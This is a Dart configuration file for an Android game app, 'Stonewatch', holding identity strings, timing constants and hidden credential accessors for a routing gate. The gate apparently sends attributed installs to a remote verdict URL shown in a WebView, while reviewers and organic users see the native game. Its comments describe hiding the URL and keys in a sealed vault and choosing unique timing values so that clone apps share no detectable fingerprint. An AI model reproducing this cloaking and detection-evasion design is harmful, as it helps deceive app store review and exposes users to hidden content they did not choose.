import '../secure/values.dart';

// ============================================================
// GATE SETTINGS — project identity + tuning constants
// ============================================================
// Single place for the values the gateway reads. Identity is
// public (it matches the store listing). Credentials and the
// endpoint resolve lazily through the sealed-value accessors, so
// no plaintext secret is ever compiled in.
//
// Timing constants are intentionally non-round and unique to this
// build so no two apps share a magic-number fingerprint.
// ============================================================

abstract final class AppSettings {
  // ── Identity (public) ──────────────────────────────────
  static const String applicationId = 'com.stonewatch.watchgame';
  static const String marketId = 'com.stonewatch.watchgame';
  static const String displayName = 'Stonewatch';

  /// Numeric iOS App Store id. Empty on this Android-only build.
  static const String storeNumericId = '';

  // ── Timings (seconds unless noted) ─────────────────────
  /// Hold-off after the player taps "Skip" on the notify invite.
  /// The exact value is sealed in the Rust vault (258864 s).
  static Duration get notifySnooze =>
      Duration(seconds: revealNotifySnoozeSeconds());

  /// Wait before re-querying GCD after an Organic first callback.
  static const Duration organicRescue = Duration(seconds: 9);

  /// Routing reply POST timeout.
  static const Duration verdictTimeout = Duration(seconds: 21);

  /// Install-conversion wait on a first launch.
  static const Duration firstInstallWait = Duration(seconds: 33);

  /// Install-conversion wait on a returning launch.
  static const Duration returningInstallWait = Duration(seconds: 8);

  /// Deep-link callback wait.
  static const Duration deepLinkWait = Duration(seconds: 6);

  /// DNS reachability probe timeout.
  static const Duration reachProbeTimeout = Duration(seconds: 7);

  /// Debounce before committing a live connectivity drop.
  static const Duration reachDropDebounce = Duration(milliseconds: 760);

  /// WebView redirect-loop retries before falling back.
  static const int redirectLoopRetries = 3;

  /// Cached verdict URL freshness window.
  static const Duration cachedUrlLifetime = Duration(days: 9);

  // ── Resolved sealed values ─────────────────────────────
  static String get verdictUrl => revealVerdictUrl();
  static String get devKey => revealDevKey();
  static String get projectNumber => revealProjectNumber();

  static String get storeId =>
      storeNumericId.isNotEmpty ? 'id$storeNumericId' : marketId;

  /// The routing gate is dormant (everyone sees the native game)
  /// until all three credentials are sealed. Lets QA exercise the
  /// game path before the backend exists.
  static bool get linksArmed =>
      verdictUrl.isNotEmpty &&
      devKey.isNotEmpty &&
      projectNumber.isNotEmpty;
}
